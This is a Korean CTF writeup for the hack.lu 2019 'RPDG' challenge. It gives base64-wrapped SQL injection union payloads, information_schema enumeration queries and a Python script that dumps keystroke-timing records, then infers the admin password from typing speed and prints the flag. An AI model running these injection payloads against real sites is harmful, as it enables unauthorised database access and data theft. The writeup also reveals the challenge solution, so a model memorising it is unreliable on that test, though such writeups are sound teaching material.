---
title: "2019 hack.lu CTF - RPDG Writeup"
description: "SQL Injection과 빈도수 분석을 통한 admin password 유추"
date: 2019-10-25
tags: ["hacklu", "sql-injection", "misc", "frequency-analysis"]
ctf: "hack.lu CTF 2019"
published: true
---

### [ Summary ]


우선 해당 문제는 WEB+MISC이다. stage. 1은 웹, stage. 2는 MISC로 풀이되기 때문이다. 기본적으로는 sql injection을 통해 정보를 획득하고, 이후 빈도수에 따라 admin password를 유추하는 문제이다.


### [ Vulnerability ]


![image](/images/writeups/hacklu-2019-rpdg_895b05e1.png)

메인페이지


문제페이지를 보면 유튜브 영상들이 있고 해당 영상 미리보기 이미지를 클릭할 시`/open.php?title={Base64 encoded movie name}`를 통해 유튜브로 이동하게 된다. 넘기는 title 파라미터를 base64 decode 해볼 시 link 주소가 아니기 때문에 내부 데이터베이스에 정보가 매핑되어 있고, 해당 파라미터의 정보가 디비로 들어갈 것을 유추해 볼 수 있따.


따라서 해당 파라미터에 sql injection을 시도하면 아래와 같이 시도할 수 있따. (thx to`03sunf@defenit`and`JeonYoungSin@defenit`)


`/open.php?title=${base64.encode('") union select 1,2,(select database()),4 -- ')}`


![image](/images/writeups/hacklu-2019-rpdg_9aa85583.png)

sql injection vuln!


또한 메인페이지에 접속시`tracc.php`를 통해 키로거가 동작한다(?)


![image](/images/writeups/hacklu-2019-rpdg_2588330c.png)

키로거가 박혀있다?


메인페이지에 진입 후 다른 페이지로 이동시`/tracc.php`를 통해 키로거마냥 내가 입력한 키들이 서버로 전송된다.


---


그럼 이제 발견된 sqli vuln으로`union select 1,2,group_concat(schema_name),4 from information_schema.schemata`이렇게 db를 쫙 긁어보자


더보기


# extracted value


> #schema : rpdg#table : culture, tracking#column culture : id, link, title, year#column tracking : id, key, path, timestamp, user


해당 컬럼들을 쫙 뽑아보면 tracking column에 key column이 안뽑힌다.


`union select 1,2,group_concat(x.key),4 from tracking as x`(thx to`JeonYoungSin@defenit`)


쫙 뽑으면 다음과 같은 데이터를 얻을 수 있다.


```
#-*-coding:utf-8-*-
import requests
import sys
import random
reload(sys)
sys.setdefaultencoding('utf-8')
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from urllib import quote

u = 'https://rpdg.fluxfingersforfuture.fluxfingers.net/open.php?title={}'


#schema : rpdg
#table : culture, tracking
#column culture : id, link, title, year
#column tracking : id, kye, path, timestamp, user

s = requests.session()
num = 0
result = ''
t1 = 0
t2 = 0

while 1:
 query = "\") union select 1,2,concat(x.key,':',x.timestamp),4 from tracking as x limit {},1 -- x".format(num).encode('base64')
 r = s.get(u.format(query), verify=False)
 #print dir(r)
 if r.status_code==200:
 print r.content
 elif r.status_code==404:
 t = r.url.split('https://rpdg.fluxfingersforfuture.fluxfingers.net/')[1]
 t2 = int(t.split(':')[1])
 with open('result.txt','a+') as f:
 f.write('{}:{}\n'.format(t,t2-t1))
 f.close()
 t1 = t2
 result += t
 print '[{}] {}'.format(num,t)

 else:
 print r.content
 num += 1

print result
```


![image](/images/writeups/hacklu-2019-rpdg_e20ecb5c.png)

추출 결과


이제 여기까지가 Web hacking의 영역이고 이후부턴 misc 영역이다.


중간에 문제풀다 막혀있을 때 힌트가 나왔는데 그 힌트가 상당히 결정적이었다.


더보기


HINT: People tend to type key combinations faster if they use them frequently, like in their passwords for example.


한마디로 사람이 익숙한 단어를 칠땐 타이핑하는 단어 사이의 간격이 짧다는 것이다. 우리가 키로거(?)를 통해 추출한 시간값들을 t2-t1 형식으로 뽑아보면 200ms 이하로 치는 단어들이 있다.


예를들어, "arang" 이라는 단어를 친다고 가정했을 때, 내가 평소 많이 치는 단어조합이 "arang"이므로 만약 내가 "language"라는 단어를 친다면 arang의 ang가 익숙하므로 다른 영문자를 타이핑할때보다 ang를 더 빠르게 친다는 것이다.


그럼 위에 추출결과처럼 표현해보면


더보기


l : 420
a : 414
n : 153
g : 148
u : 432
a : 514
g : 394
e : 412


이런식으로 된다.


따라서 이런식으로 쭉 타이핑 습관을 tracking해보면,


더보기


gra ple equ wo le ing om ap ms ci suc grap


이런 조합이 나온다.


이걸 끝말잇기 하듯이 쫙 연결해보면`womsucingraplequ`가 나온다.


이게 password일 것으로 예측하고 로그인하면 flag 획득.


`flag{GDPR_is_here_to_save_y'all}`